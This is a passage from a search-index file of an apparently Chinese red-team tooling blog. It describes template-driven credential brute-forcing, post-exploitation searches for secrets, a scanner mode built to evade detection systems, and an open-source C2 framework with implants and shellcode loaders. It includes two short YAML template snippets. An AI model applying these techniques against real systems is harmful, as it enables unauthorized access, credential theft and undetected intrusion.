</p> <p>nuclei\u7684templates\u8bed\u6cd5\u4e2d\u672c\u8eab\u5c31\u6709payload\u8fd9\u4e2a\u53ef\u4ee5\u88ab\u52a8\u6001\u4fee\u6539\u7684\u53c2\u6570, \u914d\u5408\u4e0azombie\u7684\u5b57\u5178\u751f\u6210\u5668, \u4e00\u62cd\u5373\u5408.  zombie\u53ef\u4ee5\u901a\u8fc7neutron\u5b9e\u73b0\u591a\u5927\u591a\u6570web\u5e94\u7528\u7684\u81ea\u52a8\u5316\u7206\u7834\u4ee5\u53ca\u66f4\u8fdb\u4e00\u6b65\u7684\u5b9a\u5236\u5316\u7206\u7834.  \u5404\u79cdOA, \u90ae\u7bb1, \u63a5\u53e3, \u53ea\u8981\u9002\u5408\u8d26\u53f7\u5bc6\u7801\u6709\u5173, \u4e14\u6ca1\u6709\u9a8c\u8bc1\u7801(\u5927\u90e8\u5206\u5185\u90e8\u5e94\u7528\u90fd\u6ca1\u6709\u9a8c\u8bc1\u7801\u6216\u8005\u5b58\u5728\u7279\u6b8a\u7684\u7206\u7834\u63a5\u53e3)\u7684\u670d\u52a1, \u90fd\u53ef\u4ee5\u901a\u8fc7neutron\u5feb\u901f\u5b9e\u73b0, \u5e76\u79ef\u7d2f\u4e0b\u6765. </p> <p>\u76f8\u5173\u7206\u7834\u7684poc\u5982\u4e0b: </p> <p>https://github.com/chainreactors/templates/tree/master/neutron/login</p> <p>\u53ea\u9700\u8981\u5728poc\u4e2d\u7684info\u5b57\u6bb5\u4e0b\u6dfb\u52a0\u4e13\u5c5e\u7684 zombie\u5c5e\u6027, \u5373\u53ef\u6ce8\u518c\u5230zombie\u4e2d.  \u901a\u8fc7\u8fd9\u4e2a\u65b9\u5f0f, \u73b0\u5728\u7684zombie\u652f\u630170+\u670d\u52a1/\u534f\u8bae. \u914d\u5408gogo\u7684\u81ea\u52a8\u5316\u626b\u63cf\u4e0e\u6307\u7eb9\u8bc6\u522b, \u53ef\u4ee5\u5b9e\u73b0\u8fdc\u8d85fscan, hydra, kscan\u7b49\u7b49\u4efb\u610f\u626b\u63cf\u5668\u6216\u7206\u7834\u5de5\u5177\u7684\u6548\u7387\u4e0e\u80fd\u529b, \u8ba9zombie\u53d8\u6210\u5185\u7f51\u6700\u5408\u9002\u7684\u5e2e\u624b. </p> <p>\u66f4\u91cd\u8981\u7684\u662f, \u5bf9\u4e8e\u7206\u7834\u6765\u8bf4, \u5341\u51e0\u4e2a\u7ebf\u7a0b(\u4ee3\u7406\u80fd\u591f\u627f\u53d7\u7684)\u5df2\u7ecf\u975e\u5e38\u591f\u7528, \u4e0d\u50cffscan/gogo\u8fd9\u7c7b\u5de5\u5177\u8d77\u6b65\u5c31\u662f1000,2000,4000\u7684\u5e76\u53d1(\u4ee3\u7406\u65e0\u6cd5\u627f\u53d7, \u4f1a\u5927\u91cf\u4e22\u5305). \u53ea\u9700\u8981\u4e0b\u8f7dgogo\u7684\u626b\u63cf\u7ed3\u679c, \u5373\u53ef\u8c03\u7528zombie\u914d\u5408\u4ee3\u7406\u5b9e\u73b0\u5feb\u901f\u7684, \u6279\u91cf\u7684\u81ea\u52a8\u5316\u7206\u7834.</p>"},{"location":"blog/2024/10/30/neutron-introduce/#\u66f4\u8fdb\u4e00\u6b65","title":"\u66f4\u8fdb\u4e00\u6b65","text":"<p>\u5982\u679c\u6df1\u5165\u7814\u7a76\u8fc7nuclei\u7684\u670b\u53cb\u53ef\u80fd\u4f1a\u53d1\u73b0, nuclei\u7684\u8bbe\u8ba1\u7406\u5ff5\u53ef\u4ee5\u8fd0\u7528\u5230\u5f88\u591a\u5730\u65b9, nuclei\u8fd8\u5b9e\u73b0\u4e86\u57fa\u4e8efile\u7684protocol. \u4e5f\u5c31\u662f\u5728\u672c\u5730\u6587\u4ef6\u4e2d\u67e5\u627e\u654f\u611f\u4fe1\u606f, \u6216\u8005\u5b9e\u73b0\u7b80\u5355\u7684\u4ee3\u7801\u5ba1\u8ba1\u5de5\u5177. </p> <p>\u5c06\u8fd9\u4e2a\u601d\u8def\u62d3\u5c55\u5230\u7ea2\u84dd\u5bf9\u6297\u4e2d, \u90a3\u5c31\u662f\u540e\u6e17\u900f\u4e2d, \u81ea\u52a8\u5728\u6587\u4ef6\u4e2d\u641c\u7d22\u654f\u611f\u4fe1\u606f. \u8fd9\u4e2a\u601d\u8def\u7531\u6765\u5df2\u4e45, \u7f51\u4e0a\u4e5f\u6709\u4e0d\u5c11\u8fd9\u4e2a\u7528\u9014\u7684\u5de5\u5177. </p> <p>https://github.com/qwqdanchun/Pillager</p> <p>https://github.com/Naturehi666/searchall</p> <p>\u8fd9\u4e24\u4e2a\u5de5\u5177\u4ee5\u53ca\u76f8\u540c\u7528\u9014\u7684\u5176\u4ed6\u5de5\u5177\u90fd\u6ca1\u80fd\u89e3\u51b3\u8fd9\u65b9\u9762\u7684\u81ea\u52a8\u5316, \u6253\u5230\u70b9\u540e\u8fd8\u9700\u8981\u5927\u91cf\u7684\u65f6\u95f4\u53bb\u6478. \u5b9e\u9645\u4e0a\u7f3a\u5c11\u7684\u5c31\u662f\u5c06\u7ecf\u9a8c\u53d8\u6210\u79ef\u7d2f\u7684\u80fd\u529b. \u901a\u8fc7GPT, \u53ef\u4ee5\u5c06\u7ecf\u9a8c\u5feb\u901f\u53d8\u6210\u4e00\u4e2ayaml, \u7136\u540e\u52a0\u5230templates\u4ed3\u5e93\u4e2d, \u901a\u8fc7\u56e2\u961f\u7684\u529b\u91cf\u5c06\u5176\u53d8\u6210\u57fa\u7840\u8bbe\u65bd.</p> <p>\u800cnuclei\u7684\u8bbe\u8ba1\u7406\u5ff5\u63d0\u4f9b\u7684\u5c31\u662f\u8fd9\u6837\u7684\u80fd\u529b,  \u4ecenuclei\u5f00\u59cb\u5199poc\u4e0d\u9700\u8981\u65b0\u5efa\u4e00\u4e2apython\u811a\u672c, \u53ea\u9700\u8981\u5c06burp\u4e2d\u7684\u5305\u590d\u5236\u8fc7\u6765, \u751a\u81f3\u901a\u8fc7GPT\u5c06\u6570\u636e\u5305\u76f4\u63a5\u8f6c\u4e3ayaml\u5373\u53ef. </p> <p>nuclei\u7684file\u534f\u8bae\u5982\u679c\u5355\u72ec\u62bd\u51fa\u6765, \u5c31\u53ef\u4ee5\u5c06\u8fd9\u4e2a\u80fd\u529b\u5e26\u5230\u8fd9\u4e2a\u4f7f\u7528\u573a\u666f\u4e2d.  \u5e73\u65f6\u9047\u5230\u7684\u5404\u79cd\u5404\u6837\u7684\u6846\u67b6, \u4ea7\u54c1, \u7ec4\u4ef6\u90fd\u6709\u81ea\u5df1\u7684\u914d\u7f6e\u6587\u4ef6, \u654f\u611f\u4fe1\u606f\u7b49\u7b49\u80fd\u88ab\u81ea\u52a8\u5316\u5904\u7406\u7684\u4fe1\u606f. </p> <p>\u4e5f\u662f\u6302\u5728wiki\u9996\u9875\u4e00\u5e74\u591a\u7684\u5de5\u5177<code>found</code>\u7684\u8bbe\u8ba1\u96cf\u5f62. \u53d7\u9650\u4e8e\u7cbe\u529b, \u76ee\u524d\u53ea\u5c06file\u4ecenuclei\u4e2d\u5265\u79bb\u51fa\u6765, \u53d8\u6210\u4e00\u4e2a\u72ec\u7acb\u7684\u5e93. </p> <p>found demo:</p> <p></p> <p>\u5e93\u7684\u540d\u5b57\u662fproto(\u8d28\u5b50), \u4e0eneutron\u76f8\u5bf9, \u540c\u5c5e\u4e8enuclei\u7684\u7ec4\u6210\u90e8\u5206. \u76ee\u524d\u8fd8\u5904\u4e8edemo\u72b6\u6001.</p> <p>https://github.com/chainreactors/proton  (demo)</p> <p>\u5728proton\u4e2d, \u5df2\u7ecf\u5c06file\u4ecenuclei\u4e2d\u8fc1\u79fb, \u4f46\u5728\u672c\u673a\u4fe1\u606f\u6536\u96c6\u573a\u666f\u4e0b,  \u8fd8\u6709\u66f4\u591a\u53ef\u4ee5\u5b9e\u73b0\u7684\u529f\u80fd. </p> <p>\u4f8b\u5982:</p> <ul> <li>\u5185\u5b58\u641c\u7d22, \u7c7b\u4f3cyara. \u53ef\u4ee5\u8003\u8651\u590d\u7528yara\u5f15\u64ce</li> <li>\u6ce8\u518c\u8868\u641c\u7d22, \u5f88\u591a\u8f6f\u4ef6\u7684key\u4fdd\u5b58\u5728\u6ce8\u518c\u8868\u5185</li> </ul> <p>\u8fd9\u4e24\u4e2a\u573a\u666f\u90fd\u975e\u5e38\u9002\u5408\u88abtemplates\u5316. </p>"},{"location":"blog/2024/10/30/neutron-introduce/#\u5176\u4ed6\u9879\u76ee\u66f4\u65b0","title":"\u5176\u4ed6\u9879\u76ee\u66f4\u65b0","text":""},{"location":"blog/2024/10/30/neutron-introduce/#gogo\u7684\u6539\u52a8","title":"gogo\u7684\u6539\u52a8","text":"<p>\u5728\u8fc7\u53bb\u7684\u4e24\u5e74\u4e2d, gogo\u7684\u7edd\u5927\u90e8\u5206\u80fd\u529b\u63d0\u5347\u90fd\u6765\u81eaneutron, fingers \u4ee5\u53ca\u5bf9\u5e94\u7684templates. \u5747\u5df2\u7ecf\u5728\u5404\u81ea\u5e93\u7684\u6587\u7ae0\u4e2d\u8fdb\u884c\u4ecb\u7ecd, \u8fd9\u91cc\u4e0d\u60f3\u591a\u6c34\u4e00\u7bc7\u6587\u7ae0, \u4e00\u6b21\u6027\u628agogo\u81ea\u8eab\u91cd\u8981\u7684\u6539\u52a8\u4e00\u5e76\u4ecb\u7ecd.</p> <p>TL;DR - \u652f\u6301\u66f4\u591a\u67b6\u6784\u4e0e\u66f4\u591a\u64cd\u4f5c\u7cfb\u7edf\u7684\u81ea\u52a8\u5316\u7f16\u8bd1, \u63d0\u4f9b\u4e86windowsxp\u7684release, \u4ee5\u53caandroid, solaris, freebsd\u7b49\u7b49\u64cd\u4f5c\u7cfb\u7edf\u7684\u9884\u7f16\u8bd1\u6587\u4ef6 - \u65b0\u589e\u4e0ezombie\u8054\u52a8\u7684\u76f8\u5173\u529f\u80fd - <code>--opsec</code>\u53c2\u6570, \u6240\u6709\u5df2\u77e5\u88ab\u8bbe\u5907\u6807\u8bb0\u7684\u626b\u63cf\u63a2\u9488\u90fd\u53ef\u4ee5\u6dfb\u52a0\u8fd9\u4e2a\u53c2\u6570\u5173\u95ed. \u4ee5\u53ca\u5927\u91cf\u5173\u4e8eopsec\u7684\u6539\u52a8     - \u51cf\u5c11icmp\u63a2\u6d4b\u7684\u7279\u5f81     - \u968f\u673a\u5316http\u534f\u8bae\u63a2\u9488\u7684UA     - \u51cf\u5c11\u591a\u4e2a\u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b\u7684\u7279\u5f81     - \u968f\u673a\u5316\u7f51\u6bb5\u626b\u63cf\u65f6\u7684ip\u751f\u6210\u5668 - \u652f\u6301<code>--exclude</code>/<code>--exclude-file</code>\u6392\u9664\u6307\u5b9a\u7f51\u6bb5 - \u652f\u6301ipv6\u7f51\u6bb5\u7684\u89e3\u6790\u4e0e\u626b\u63cf - templates\u5927\u91cf\u6539\u52a8     - \u65b0\u589e100.64.0.0/10\u4fdd\u7559\u5730\u5740\u7684workflow\u914d\u7f6e     - \u589e\u52a0\u6570\u5341\u4e2a\u5404\u7c7b\u73b0\u4ee3\u670d\u52a1\u7684\u9ed8\u8ba4\u7aef\u53e3\u914d\u7f6e     - ..... - \u5927\u91cf\u7ec6\u8282\u4e0a\u7684\u6539\u52a8\u4e0ebug\u4fee\u590d, \u4e0d\u4e00\u4e00\u8d58\u8ff0. </p> <p>\u73b0\u5728\u7684gogo\u662f\u6240\u6709\u626b\u63cf\u5668\u4e2d, \u53d1\u5305\u6570\u91cf\u6700\u5c11,\u4f46\u662f\u80fd\u83b7\u53d6\u6700\u591a\u4fe1\u606f\u7684\u626b\u63cf\u5668. \u5e76\u4e14\u80fd\u8ba9\u591a\u5bb6\u5382\u5546\u7684\u6001\u52bf\u611f\u77e5\u5b8c\u5168\u65e0\u611f(\u9700\u5f00\u542f <code>--opsec</code> \u914d\u7f6e).</p>"},{"location":"blog/2024/10/30/neutron-introduce/#\u81ea\u5b9a\u4e49opsec\u914d\u7f6e","title":"\u81ea\u5b9a\u4e49opsec\u914d\u7f6e","text":"<p>fingers\u7684opsec <pre><code>- name: swagger\n  focus: true\n  opsec: true\n  rule:\n    - regexps:\n        vuln:\n          - Swagger UI\n      send_data: /swagger-ui.html\n      info: swagger leak\n</code></pre></p> <p>neutron\u7684opsec <pre><code>id: shiro-default-key\nopsec: true\ninfo:\n  name: brute Shiro key\n  severity: critical\n  tags: shiro\n...\n</code></pre></p> <p>\u901a\u8fc7\u5728templates\u4e2d\u6dfb\u52a0\u8fd9\u4e24\u4e2a\u914d\u7f6e\u9879\u5373\u53ef\u5728<code>--opsec</code>\u65f6\u81ea\u52a8\u5ffd\u7565</p>"},{"location":"blog/2024/10/30/neutron-introduce/#words","title":"words","text":"<p>repo: https://github.com/chainreactors/words</p> <p>docs: https://chainreactors.github.io/wiki/libs/words/</p> <p>\u66f4\u52a0\u8f7b\u91cf</p> <p>\u4f7f\u7528\u6765\u81eawords(\u81ea\u7814\u7684\u4e00\u4e9b\u811a\u672c\u89e3\u91ca\u5668, \u7528\u6765\u4ee3\u66ffhashcat\u7684mask/rule) \u65b0\u589e\u7684logic\u8868\u8fbe\u5f0f\u4ee3\u66ff\u66f4\u52a0\u91cd\u91cf\u7ea7\u7684expr\u8868\u8fbe\u5f0f, \u5e26\u6765\u4e86\u7ea610%\u7684\u6027\u80fd\u63d0\u5347\u548c\u4f53\u79ef\u7684\u6570\u767ek\u7684\u51cf\u5c11. </p> <p>\u6b22\u8fce\u5728\u5404\u7c7b\u9879\u76ee\u4e2d\u4f7f\u7528words\u5b9e\u73b0\u57fa\u4e8e\u63a9\u7801\u548c\u57fa\u4e8erule\u7684\u5b57\u5178\u751f\u6210\u5668. words\u6ca1\u6709\u4efb\u4f55\u4f9d\u8d56, \u4e0d\u4f1a\u5e26\u6765\u4efb\u4f55\u8d1f\u62c5, \u4f46\u662f\u53ef\u4ee5\u5b9e\u73b0\u975e\u5e38\u5f3a\u5927\u80fd\u529b. \u76ee\u524d\u5df2\u7ecf\u5728fingers, spray, zombie\u4e2d\u88ab\u4f7f\u7528</p> <p></p>"},{"location":"blog/2024/10/30/neutron-introduce/#spray","title":"spray","text":"<p>\u65b0\u589e\u4e86\u4e00\u4e2apanel\u5e2e\u52a9\u7528\u6237\u66f4\u597d\u7684\u7406\u89e3spray\u7684\u5de5\u4f5c\u65b9\u5f0f</p> <p></p>"},{"location":"blog/2024/10/30/neutron-introduce/#iom-v003-\u9884\u544a","title":"IoM v0.0.3 \u9884\u544a","text":"<p>IoM\u5728v0.0.1\u53d1\u5e03\u4e4b\u540e, \u7ecf\u8fc7\u4e86v0.0.2 \u5bf9server/client\u7684\u91cd\u6784, \u73b0\u5728implant\u4e5f\u8fce\u6765\u4e86\u5f7b\u5e95\u7684\u91cd\u6784. </p> <p>\u6211\u4eec\u5b9e\u73b0\u4e86srdi, \u624b\u6413\u6c47\u7f16\u5b9e\u73b0\u7684shellcode generator, stage1 \u52a0\u8f7d\u5668, \u63d2\u4ef6\u5408\u96c6\u4e0e\u63d2\u4ef6\u4ed3\u5e93\u7b49\u7b49\u7b49\u7b49\u4e00\u7cfb\u5217\u65b0\u529f\u80fd. </p> <p>\u66f4\u91cd\u8981\u7684\u662f, \u6211\u4eec**\u5c06\u8fd9\u4e9b\u65b0\u529f\u80fd\u7edf\u7edf\u5f00\u6e90**, IoM\u5c06\u4f1a\u662f\u6700\u5f3a\u5927\u7684\u53ef\u81ea\u5b9a\u4e49\u7684C2\u6846\u67b6. </p> <p>v0.0.3\u7248\u672c\u7684IoM\u5c06\u662f\u5f00\u6e90\u751f\u6001\u4e2d\u6700\u5f3a\u5927\u7684C2\u4e4b\u4e00, \u5728\u529f\u80fd\u8986\u76d6\u4e0a\u5df2\u7ecf\u8d85\u8fc7\u4e86Havoc\u548cSliver\u8fd9\u4e9b\u77e5\u540dC2\u6846\u67b6, \u5e76\u4e14**\u57fa\u4e8e\u6a21\u5757\u5316\u5b9e\u73b0\u7684\u524d\u6240\u672a\u6709\u7684\u81ea\u5b9a\u4e49\u4e0e\u62d3\u5c55\u80fd\u529b**. </p> <p>v0.0.3 \u9884\u8ba1\u5728\u5341\u4e00\u6708\u7684\u7b2c\u4e00\u5468\u53d1\u5e03.</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/","title":"IoM\u8bbe\u8ba101   \u4ece\u7cfb\u7edf\u5de5\u7a0b\u7684\u89d2\u5ea6\u91cd\u65b0\u8bbe\u8ba1C2\u6846\u67b6 Part1","text":"<p>IoM \u8bbe\u8ba1\u7cfb\u5217\u4e3b\u8981\u95f2\u8bddIoM\u7684\u8bbe\u8ba1\u7406\u5ff5\uff0c\u6280\u672f\u9009\u578b\uff0c \u5bf9\u793e\u533a\u3001\u73af\u5883\u3001\u672a\u6765\u7684\u601d\u8003\u7b49\u3002 \u4e5f\u8bb8\u80fd\u7ed9\u505a\u540c\u6837\u4e8b\u60c5\u7684\u670b\u53cb\u5e26\u6765\u4e00\u4e9b\u4e0d\u4e00\u6837\u7684\u60f3\u6cd5\u3002 \u4e0e\u8fdb\u9636\u7cfb\u5217\u4e0d\u540c\u7684\u662f\uff0c \u8bbe\u8ba1\u7cfb\u5217\u4e0d\u4f1a\u6709\u592a\u591a\u7684\u4ee3\u7801\uff0c\u4f46\u8fd9\u5e76\u4e0d\u610f\u5473\u7740\u4fe1\u606f\u91cf\u964d\u4f4e :)</p> <p>\u6f84\u6e05\u4e00\u4e2a\u8bef\u4f1a\uff0c \u5f88\u591a\u670b\u53cb\u4ee5\u4e3aIoM\u51e0\u6b21\u66f4\u65b0\u516c\u544a\u4e2d\u63d0\u5230\u7684\u529f\u80fd\u53ea\u5728 Professional\u7248\u672c\u4e2d\u53ef\u4ee5\u4f7f\u7528\uff0c \u4f46\u5b9e\u9645\u4e0a\u9664\u4e86\u6781\u5c11\u6570\u529f\u80fd\u5916\uff0c95%\u4ee5\u4e0a\u7684\u529f\u80fd\u90fd\u5728\u793e\u533a\u7248\u4e2d\u4f7f\u7528\uff0c \u53ea\u662fOPSEC\u7565\u6709\u4e0d\u540c\u3002</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#\u80cc\u666f","title":"\u80cc\u666f","text":"<p>\u6211\u4eec\u4e3a\u4ec0\u4e48\u60f3\u8981\u81ea\u5df1\u5b9e\u73b0\u4e00\u4e2aC2 Framework, \u5176\u4e2d\u6709\u5bf9CobaltStrike\u6280\u672f\u8def\u7ebf\u4e0d\u591f\u6ee1\u610f\uff0c\u53c8\u65e0\u5948\u4e0e\u65e0\u6cd5\u5728\u5f00\u6e90\u793e\u533a\u4e2d\u627e\u5230\u4e00\u4e2a\u8db3\u591f\u6210\u719f\u7684C2\u4ee3\u66ff\uff0c\u66f4\u662f\u8ba1\u5212\u7528\u65b0\u7684\u6280\u672f\u8def\u7ebf\u53bb\u5c1d\u8bd5\u65b0\u7684\u60f3\u6cd5\u3002 </p> <p>\u4e5f\u56e0\u6b64**IoM\u5728\u6280\u672f\u9009\u578b\u4e0a\u4f1a\u76f8\u5bf9\u6fc0\u8fdb,** \u6211\u4eec\u5c1d\u8bd5\u91c7\u7528golang(client/server/listener) + rust(implant) \u4f5c\u4e3a\u57fa\u8c03\uff0c \u5e76\u4ee5\u6b64\u4e3a\u57fa\u7840\u5c1d\u8bd5\u91cd\u65b0\u5b9e\u73b0\u5f00\u6e90\u793e\u533a\u4e2d\u5b58\u5728\u7684\u5df2\u6709\u7684\u4e00\u5207\u6280\u672f\uff08\u53ea\u4ee3\u8868\u5927\u81f4\u8def\u7ebf\uff0c\u6211\u4eec\u5f53\u7136\u6ca1\u6709\u80fd\u529b\u53bb\u5b9e\u73b0\u6240\u6709\u6280\u672f\uff09\u3002</p> <p>\u6211\u4eec\u7684server/client \u91c7\u7528\u4e86\u7c7b\u4f3csliver\u7c7b\u4f3c\u7684\u8f6f\u4ef6\u67b6\u6784, grpc + repl(\u4ea4\u4e92\u5f0f\u547d\u4ee4\u884c) , \u5728\u65e9\u671f\u7248\u672c\u4e2d(v0.0.1)\uff0c \u4e5f\u590d\u7528\u4e86\u4e0d\u5c11sliver\u7684\u4ee3\u7801\uff0c \u4f46\u5728\u540e\u7eed\u7684\u66f4\u65b0\u4e2d\u6e90\u81easliver\u7684\u51e0\u4e4e\u6240\u6709\u4ee3\u7801\u90fd\u5df2\u7ecf\u88ab\u91cd\u6784\uff0c \u53ea\u8fd8\u4fdd\u7559\u7740\u6709\u4e00\u4e9b\u7c7b\u4f3c\u7684\u8f6f\u4ef6\u67b6\u6784\u3002 </p> <p>\u800c\u5728listener\u4e0a\uff0c \u6211\u4eec\u4e00\u5f00\u59cb\u5c31\u5c06\u5176\u4eceserver\u4e2d\u89e3\u8026\u51fa\u6765\uff0c listener\u968f\u7740\u66f4\u65b0\u4f1a\u8d8a\u6765\u8d8a\u6765\u81ea\u7531\uff0c\u6700\u7ec8\u76ee\u7684\u662f\u5728\u4efb\u4f55\u5b58\u5728\u6570\u636e\u4ea4\u6362\u7684\u5730\u65b9\u6784\u5efa(\u548crem\u7684\u8bbe\u8ba1\u7406\u5ff5\u4e00\u81f4, \u5b9e\u9645\u4e0a\u4e5f\u4f9d\u8d56rem\u5b9e\u73b0)\u3002</p> <p>\u6700\u5173\u952e\u7684implant\u5219\u9009\u7528\u4e86rust\uff0c \u4e0d\u5f97\u4e0d\u8bf4\uff0c \u8fd9\u4e2a\u51b3\u5b9a\u8ba9\u6211\u4eec\u8e29\u4e86\u65e0\u6570\u5751\u3002\u76ee\u524d\u770b\u6765\u786e\u5b9e\u6ca1\u6709\u6bd4rust\u66f4\u597d\u7684\u9009\u62e9\uff0c \u4f46\u8fd9\u5e76\u4e0d\u4ee3\u8868rust\u80fd\u5b8c\u5168\u80dc\u4efb\u6211\u4eec\u7684\u9700\u6c42\u3002rust\u7ed9\u6211\u4eec\u5e26\u6765\u7684\u9ebb\u70e6\u5305\u62ec \u7f16\u8bd1\u73af\u5883\uff0c \u7f16\u8bd1\uff0c \u94fe\u63a5\uff0c \u751f\u6210\u7684target\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f9d\u8d56\uff0c \u517c\u5bb9\u6027\u7b49\u7b49\u95ee\u9898\u3002 \u8fd9\u91cc\u9762\u6709\u975e\u5e38\u591a\u7684\u95ee\u9898\u4e0d\u662f\u6211\u4eec\u4f7f\u7528\u4e0a\u7684\u95ee\u9898\uff0c \u591a\u534a\u81ea\u4e8erust\u81ea\u8eab\u7684bug, \u8bbe\u8ba1\u3002 \u5728\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u7684\u8fc7\u7a0b\u4e2d\uff0c \u6211\u4eec\u5c06\u4e00\u90e8\u5206\u5185\u5bb9\u6574\u7406\u6210\u4e86IoM\u8fdb\u9636\u7cfb\u5217\uff0c \u4e5f\u5c31\u662f\u524d\u51e0\u5929\u53d1\u7684 <code>PE Loader/RDI\u7684TLS\u4e4b\u6b87</code>\u3002\u800c\u548c\u8fd9\u4e2a\u95ee\u9898\u5dee\u4e0d\u591a\u62bd\u8c61\u7684\u95ee\u9898\uff0c \u5927\u6982\u8fd8\u670910\u4e2a (\u5f53\u7136\u4e5f\u6709\u529e\u6cd5\u7ed5\u8fc7\u6216\u8005\u653e\u5f03\u4e00\u90e8\u5206\u80fd\u529b\uff0c\u4f46\u662f\u8fd9\u4e48\u505a\u4e0b\u53bb\u5c31\u53d8\u6210\u5c31\u53d8\u5f97\u65e0\u8da3\u4e86)\u3002</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#\u603b\u89c8","title":"\u603b\u89c8","text":"<p>\u76ee\u524d\u7684IoM\u7684\u901a\u8baf\u67b6\u6784</p> <ul> <li>client&lt;-&gt;server \u4ea4\u4e92\u901a\u8fc7grpc\u5b9e\u73b0</li> <li>server\u4e0elistener\u5219\u901a\u8fc7\u7edf\u4e00\u7684\u6570\u636e\u5305\u534f\u8bae<code>Spite</code>(protobuf\u7684message)\u4ea4\u4e92. </li> <li>listener\u4e0emalefic(malefic\u53ea\u662fimplant\u7684\u4e00\u4e2a\u5177\u4f53\u5b9e\u73b0)\u901a\u8fc7parser\u5c06\u6570\u636e\u89e3\u6790\u4e3a<code>Spite</code></li> </ul> <p>\u7b80\u5355\u6765\u8bf4\u5c31\u662flistener\u4e0a\u53ef\u4ee5\u6839\u636eparser\u5207\u6362\u4e0d\u540c\u7684implant\u534f\u8bae\u3002 client/server/listener\u4e4b\u95f4\u7684\u4ea4\u4e92\u7edf\u4e00\u4f7f\u7528\u540c\u4e00\u4e2aprotobuf \u5b9a\u4e49\u3002 </p> <p>\u5bf9\u4e8e\u62d3\u5c55\u6027\u6765\u8bf4\uff0c \u4e3b\u8981\u5728\u8fd9\u56db\u4e2a\u5730\u65b9\u8fdb\u884c\u62d3\u5c55</p> <ul> <li>Client\u7aef\u63d2\u4ef6\u811a\u672c\u8bed\u8a00\u548cCommand</li> <li>Server\u7aefrpc</li> <li>Listener\u7684Pipeline\u548cParser</li> <li>Implant\u7aef\u7684module, kits, 3<sup>rd</sup>-module</li> </ul> <p>\u5728\u7528\u6237\u770b\u6765, \u6700\u7ec8\u4f7f\u7528\u4f53\u9a8c\u4f1aCS\u7684aggressor script\u76f8\u4f3c\uff0c \u4e5f\u5bf9\u80fd\u529b\u66f4\u5f3a\u7684\u5f00\u53d1\u8005\u4fdd\u7559\u4e86\u5b8c\u6574\u7684SDK\u4ee5\u53ca\u975e\u5e38\u591a\u53ef\u4ee5\u4e8c\u5f00\u7684\u63a5\u53e3\u3002 </p> <p>\u5728\u672c\u6587\u53d1\u5e03\u65f6\uff0c\u5df2\u7ecf\u5b9e\u73b0\u672c\u6587\u63d0\u5230\u7684100%\u7684\u5185\u5bb9\uff0c\u5747\u53ef\u4ee5\u5728\u6211\u4eec\u7684github\u4e2d\u627e\u5230</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#client\u7aef","title":"Client\u7aef","text":""},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#\u751f\u6001","title":"\u751f\u6001","text":"<p>CS\u65e9\u671f\u7248\u672c\u4e2d\u901a\u8fc7\u7528\u6237\u81ea\u53d1\u7684\u5f00\u6e90\u5f62\u6210\u4e86\u793e\u533a\u4e86, \u5728\u8fd1\u51e0\u5e74\u6dfb\u52a0\u4e86 https://cobalt-strike.github.io/community_kit/ \u5b98\u65b9\u7684\u793e\u533a\u63d2\u4ef6\u7d22\u5f15. </p> <p>sliver\u5219\u901a\u8fc7\u5728\u5b98\u65b9\u7edf\u4e00\u7ef4\u62a4\u4e86armory\u6b66\u5668\u5e93 , \u4f46sliver\u63d0\u4f9b\u7684\u62d3\u5c55\u80fd\u529b\u5f88\u6709\u9650, \u53ea\u80fd\u7b80\u5355\u6ce8\u518c\u547d\u4ee4, \u9884\u8bbe\u53c2\u6570. \u5728\u652f\u6301\u7684\u751f\u6001\u4e0a\u4e5f\u53ea\u6709 bof, dll, CLR. </p> <p>\u5728\u524d\u4eba\u7684\u5de5\u4f5c\u4e0a\u6539\u8fdbIoM\u7684\u63d2\u4ef6\u751f\u6001\u8bbe\u8ba1. \u6211\u4eec\u8ba1\u5212\u5728\u591a\u4e2a\u7ef4\u5ea6\u63d0\u4f9b\u4e0d\u540c\u9886\u57df\u7684\u62d3\u5c55\u80fd\u529b. </p> <p>\u6211\u4eec\u5728IoM\u7684\u8bbe\u8ba1\u6587\u6863\u4e2d\u63d0\u5230\u8fc7\u63d2\u4ef6\u76f8\u5173\u8bbe\u8ba1\u76ee\u6807 </p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#mals","title":"mals","text":"<p>mals\u662f\u4e3b\u8981\u7684\u9762\u5411\u7528\u6237\u7684\u62d3\u5c55\u63a5\u53e3\u3002 